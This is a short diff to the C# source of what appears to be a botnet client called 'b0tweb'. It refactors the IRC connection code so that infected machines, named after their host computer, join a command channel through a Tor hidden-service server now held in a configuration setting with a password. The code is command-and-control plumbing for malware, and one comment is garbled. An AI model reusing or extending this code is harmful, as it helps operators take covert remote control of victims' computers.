@@ -19,11 +19,6 @@ namespace b0tweb
         private IrcClient _irc;
 
         /// <summary>
-        /// The Tor server to connect to.
-        /// </summary>
-        private const string Server = "botwebzoqpduhxj7hgbu2f6vooyj3lt3q6f6lxir7wb7xjilmvbzkzid.onion";
-
-        /// <summary>
         /// The IRC port to use fogit r the connection.
         /// </summary>
         private const int Port = 6667;
@@ -60,6 +55,7 @@ namespace b0tweb
         {
             Random rand = new Random();
             this._irc = new IrcClient();
+
             this._nick = "bot_" + Environment.MachineName + "_" + rand.Next(0, 1000).ToString();
             this._realName = this._nick + "_real";
 
@@ -105,8 +101,8 @@ namespace b0tweb
         /// <param name="channel">The channel to join.</param>
         public void Join(string channel)
         {
-            this._irc.Connect(IRCConnectionController.Server, IRCConnectionController.Port);
-            this._irc.Login(this._nick, this._realName);
+            this._irc.Connect(Configuration.IRCServer, IRCConnectionController.Port);
+            this._irc.Login(this._nick, this._realName, 0, "", Configuration.IRCPassword);
             this._irc.RfcJoin(channel);
         }
 
